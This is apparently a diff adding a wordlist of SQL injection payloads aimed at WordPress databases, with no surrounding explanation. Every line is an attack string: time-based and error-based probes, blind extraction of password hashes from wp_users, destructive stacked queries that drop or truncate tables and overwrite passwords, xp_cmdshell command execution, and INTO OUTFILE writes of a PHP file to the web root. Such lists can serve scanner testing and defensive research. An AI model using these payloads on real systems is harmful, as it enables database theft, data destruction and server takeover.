+1') AND CASE WHEN (1=1) THEN PG_SLEEP(5) ELSE 0 END-- 
+1') AND (SELECT SLEEP(5))-- 
+1') AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- 
+1') AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1-- 
+1') AND GET_LOCK('a',5)-- 
+1') AND RANDOMBLOB(500000000)-- 
+1') OR SLEEP(5)-- 
+1') OR SLEEP(0.5)-- 
+1') OR BENCHMARK(5000000,SHA1(1))-- 
+1') OR PG_SLEEP(5)-- 
+1') OR IF(1=1,SLEEP(5),0)-- 
+1') OR IF(SUBSTR(version(),1,1)='8',SLEEP(5),0)-- 
+1') OR CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END-- 
+1') OR CASE WHEN (1=1) THEN PG_SLEEP(5) ELSE 0 END-- 
+1') OR (SELECT SLEEP(5))-- 
+1') OR (SELECT * FROM (SELECT(SLEEP(5)))a)-- 
+1') OR DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1-- 
+1') OR GET_LOCK('a',5)-- 
+1') OR RANDOMBLOB(500000000)-- 
+admin' AND SLEEP(5)-- 
+admin' AND SLEEP(0.5)-- 
+admin' AND BENCHMARK(5000000,SHA1(1))-- 
+admin' AND PG_SLEEP(5)-- 
+admin' AND IF(1=1,SLEEP(5),0)-- 
+admin' AND IF(SUBSTR(version(),1,1)='8',SLEEP(5),0)-- 
+admin' AND CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END-- 
+admin' AND CASE WHEN (1=1) THEN PG_SLEEP(5) ELSE 0 END-- 
+admin' AND (SELECT SLEEP(5))-- 
+admin' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- 
+admin' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1-- 
+admin' AND GET_LOCK('a',5)-- 
+admin' AND RANDOMBLOB(500000000)-- 
+admin' OR SLEEP(5)-- 
+admin' OR SLEEP(0.5)-- 
+admin' OR BENCHMARK(5000000,SHA1(1))-- 
+admin' OR PG_SLEEP(5)-- 
+admin' OR IF(1=1,SLEEP(5),0)-- 
+admin' OR IF(SUBSTR(version(),1,1)='8',SLEEP(5),0)-- 
+admin' OR CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END-- 
+admin' OR CASE WHEN (1=1) THEN PG_SLEEP(5) ELSE 0 END-- 
+admin' OR (SELECT SLEEP(5))-- 
+admin' OR (SELECT * FROM (SELECT(SLEEP(5)))a)-- 
+admin' OR DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1-- 
+admin' OR GET_LOCK('a',5)-- 
+admin' OR RANDOMBLOB(500000000)-- 
+1 AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- 
+1 AND UPDATEXML(1,CONCAT(0x7e,database()),1)-- 
+1 AND GTID_SUBSET(CONCAT(0x7e,user()),1)-- 
+1 AND EXP(~(SELECT * FROM (SELECT user())a))-- 
+1 AND FLOOR(RAND(0)*2)-- 
+1 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))-- 
+1 AND NAME_CONST(version(),1)-- 
+1 AND XMLTYPE('<x/>')-- 
+1 OR EXTRACTVALUE(1,CONCAT(0x7e,version()))-- 
+1 OR UPDATEXML(1,CONCAT(0x7e,database()),1)-- 
+1 OR GTID_SUBSET(CONCAT(0x7e,user()),1)-- 
+1 OR EXP(~(SELECT * FROM (SELECT user())a))-- 
+1 OR FLOOR(RAND(0)*2)-- 
+1 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))-- 
+1 OR NAME_CONST(version(),1)-- 
+1 OR XMLTYPE('<x/>')-- 
+1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- 
+1' AND UPDATEXML(1,CONCAT(0x7e,database()),1)-- 
+1' AND GTID_SUBSET(CONCAT(0x7e,user()),1)-- 
+1' AND EXP(~(SELECT * FROM (SELECT user())a))-- 
+1' AND FLOOR(RAND(0)*2)-- 
+1' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))-- 
+1' AND NAME_CONST(version(),1)-- 
+1' AND XMLTYPE('<x/>')-- 
+1' OR EXTRACTVALUE(1,CONCAT(0x7e,version()))-- 
+1' OR UPDATEXML(1,CONCAT(0x7e,database()),1)-- 
+1' OR GTID_SUBSET(CONCAT(0x7e,user()),1)-- 
+1' OR EXP(~(SELECT * FROM (SELECT user())a))-- 
+1' OR FLOOR(RAND(0)*2)-- 
+1' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))-- 
+1' OR NAME_CONST(version(),1)-- 
+1' OR XMLTYPE('<x/>')-- 
+1" AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- 
+1" AND UPDATEXML(1,CONCAT(0x7e,database()),1)-- 
+1" AND GTID_SUBSET(CONCAT(0x7e,user()),1)-- 
+1" AND EXP(~(SELECT * FROM (SELECT user())a))-- 
+1" AND FLOOR(RAND(0)*2)-- 
+1" AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))-- 
+1" AND NAME_CONST(version(),1)-- 
+1" AND XMLTYPE('<x/>')-- 
+1" OR EXTRACTVALUE(1,CONCAT(0x7e,version()))-- 
+1" OR UPDATEXML(1,CONCAT(0x7e,database()),1)-- 
+1" OR GTID_SUBSET(CONCAT(0x7e,user()),1)-- 
+1" OR EXP(~(SELECT * FROM (SELECT user())a))-- 
+1" OR FLOOR(RAND(0)*2)-- 
+1" OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))-- 
+1" OR NAME_CONST(version(),1)-- 
+1" OR XMLTYPE('<x/>')-- 
+1') AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- 
+1') AND UPDATEXML(1,CONCAT(0x7e,database()),1)-- 
+1') AND GTID_SUBSET(CONCAT(0x7e,user()),1)-- 
+1') AND EXP(~(SELECT * FROM (SELECT user())a))-- 
+1') AND FLOOR(RAND(0)*2)-- 
+1') AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))-- 
+1') AND NAME_CONST(version(),1)-- 
+1') AND XMLTYPE('<x/>')-- 
+1') OR EXTRACTVALUE(1,CONCAT(0x7e,version()))-- 
+1') OR UPDATEXML(1,CONCAT(0x7e,database()),1)-- 
+1') OR GTID_SUBSET(CONCAT(0x7e,user()),1)-- 
+1') OR EXP(~(SELECT * FROM (SELECT user())a))-- 
+1') OR FLOOR(RAND(0)*2)-- 
+1') OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))-- 
+1') OR NAME_CONST(version(),1)-- 
+1') OR XMLTYPE('<x/>')-- 
+1; DROP TABLE wp_users-- 
+1; DELETE FROM wp_users-- 
+1; UPDATE wp_users SET user_pass='x'-- 
+1; INSERT INTO wp_options VALUES(1,'a','b')-- 
+1; TRUNCATE TABLE wp_comments-- 
+1; CREATE USER evil-- 
+1; ALTER TABLE wp_users DROP col-- 
+1; WAITFOR DELAY '0:0:5'-- 
+1; WAITFOR TIME '23:59:59'-- 
+1; EXEC xp_cmdshell('id')-- 
+1; EXECUTE sp_executesql N'SELECT 1'-- 
+1; SHUTDOWN-- 
+1; SELECT PG_SLEEP(5)-- 
+1; SELECT SLEEP(5)-- 
+1'; DROP TABLE wp_users-- 
+1'; DELETE FROM wp_users-- 
+1'; UPDATE wp_users SET user_pass='x'-- 
+1'; INSERT INTO wp_options VALUES(1,'a','b')-- 
+1'; TRUNCATE TABLE wp_comments-- 
+1'; CREATE USER evil-- 
+1'; ALTER TABLE wp_users DROP col-- 
+1'; WAITFOR DELAY '0:0:5'-- 
+1'; WAITFOR TIME '23:59:59'-- 
+1'; EXEC xp_cmdshell('id')-- 
+1'; EXECUTE sp_executesql N'SELECT 1'-- 
+1'; SHUTDOWN-- 
+1'; SELECT PG_SLEEP(5)-- 
+1'; SELECT SLEEP(5)-- 
+1"; DROP TABLE wp_users-- 
+1"; DELETE FROM wp_users-- 
+1"; UPDATE wp_users SET user_pass='x'-- 
+1"; INSERT INTO wp_options VALUES(1,'a','b')-- 
+1"; TRUNCATE TABLE wp_comments-- 
+1"; CREATE USER evil-- 
+1"; ALTER TABLE wp_users DROP col-- 
+1"; WAITFOR DELAY '0:0:5'-- 
+1"; WAITFOR TIME '23:59:59'-- 
+1"; EXEC xp_cmdshell('id')-- 
+1"; EXECUTE sp_executesql N'SELECT 1'-- 
+1"; SHUTDOWN-- 
+1"; SELECT PG_SLEEP(5)-- 
+1"; SELECT SLEEP(5)-- 
+1); DROP TABLE wp_users-- 
+1); DELETE FROM wp_users-- 
+1); UPDATE wp_users SET user_pass='x'-- 
+1); INSERT INTO wp_options VALUES(1,'a','b')-- 
+1); TRUNCATE TABLE wp_comments-- 
+1); CREATE USER evil-- 
+1); ALTER TABLE wp_users DROP col-- 
+1); WAITFOR DELAY '0:0:5'-- 
+1); WAITFOR TIME '23:59:59'-- 
+1); EXEC xp_cmdshell('id')-- 
+1); EXECUTE sp_executesql N'SELECT 1'-- 
+1); SHUTDOWN-- 
+1); SELECT PG_SLEEP(5)-- 
+1); SELECT SLEEP(5)-- 
+1'); DROP TABLE wp_users-- 
+1'); DELETE FROM wp_users-- 
+1'); UPDATE wp_users SET user_pass='x'-- 
+1'); INSERT INTO wp_options VALUES(1,'a','b')-- 
+1'); TRUNCATE TABLE wp_comments-- 
+1'); CREATE USER evil-- 
+1'); ALTER TABLE wp_users DROP col-- 
+1'); WAITFOR DELAY '0:0:5'-- 
+1'); WAITFOR TIME '23:59:59'-- 
+1'); EXEC xp_cmdshell('id')-- 
+1'); EXECUTE sp_executesql N'SELECT 1'-- 
+1'); SHUTDOWN-- 
+1'); SELECT PG_SLEEP(5)-- 
+1'); SELECT SLEEP(5)-- 
+1' ORDER BY 1-- 
+1' ORDER BY 100-- 
+1' GROUP BY 1,2,3-- 
+1' HAVING 1=1-- 
+1' HAVING 1=0-- 
+1' INTO OUTFILE '/var/www/s.php'-- 
+1' INTO DUMPFILE '/tmp/x'-- 
+1' AND (SELECT COUNT(*) FROM wp_users)>0-- 
+1' AND EXISTS(SELECT 1 FROM wp_users)-- 
+1' AND 1 IN (SELECT ID FROM wp_users)-- 
+1' AND ASCII(SUBSTRING((SELECT user_pass FROM wp_users LIMIT 1),1,1))>64-- 
+1' AND ORD(MID((SELECT database()),1,1))>64-- 
+1' AND LENGTH(database())>3-- 
+1' AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1-- 
+1" ORDER BY 1-- 
+1" ORDER BY 100-- 
+1" GROUP BY 1,2,3-- 
+1" HAVING 1=1-- 
+1" HAVING 1=0-- 
+1" INTO OUTFILE '/var/www/s.php'-- 
+1" INTO DUMPFILE '/tmp/x'-- 
+1" AND (SELECT COUNT(*) FROM wp_users)>0-- 
+1" AND EXISTS(SELECT 1 FROM wp_users)-- 
+1" AND 1 IN (SELECT ID FROM wp_users)-- 
+1" AND ASCII(SUBSTRING((SELECT user_pass FROM wp_users LIMIT 1),1,1))>64-- 
+1" AND ORD(MID((SELECT database()),1,1))>64-- 
+1" AND LENGTH(database())>3-- 
+1" AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1-- 
+1') ORDER BY 1-- 
+1') ORDER BY 100-- 
+1') GROUP BY 1,2,3-- 
+1') HAVING 1=1-- 
+1') HAVING 1=0-- 
+1') INTO OUTFILE '/var/www/s.php'-- 
+1') INTO DUMPFILE '/tmp/x'-- 
+1') AND (SELECT COUNT(*) FROM wp_users)>0-- 
+1') AND EXISTS(SELECT 1 FROM wp_users)-- 
+1') AND 1 IN (SELECT ID FROM wp_users)-- 
+1') AND ASCII(SUBSTRING((SELECT user_pass FROM wp_users LIMIT 1),1,1))>64-- 
+1') AND ORD(MID((SELECT database()),1,1))>64-- 
+1') AND LENGTH(database())>3-- 
+1') AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1-- 
+1") ORDER BY 1-- 
+1") ORDER BY 100-- 
+1") GROUP BY 1,2,3-- 
+1") HAVING 1=1-- 
+1") HAVING 1=0-- 
+1") INTO OUTFILE '/var/www/s.php'-- 
+1") INTO DUMPFILE '/tmp/x'-- 
+1") AND (SELECT COUNT(*) FROM wp_users)>0-- 
+1") AND EXISTS(SELECT 1 FROM wp_users)-- 
+1") AND 1 IN (SELECT ID FROM wp_users)-- 
+1") AND ASCII(SUBSTRING((SELECT user_pass FROM wp_users LIMIT 1),1,1))>64-- 
+1") AND ORD(MID((SELECT database()),1,1))>64-- 
+1") AND LENGTH(database())>3-- 
+1") AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1-- 
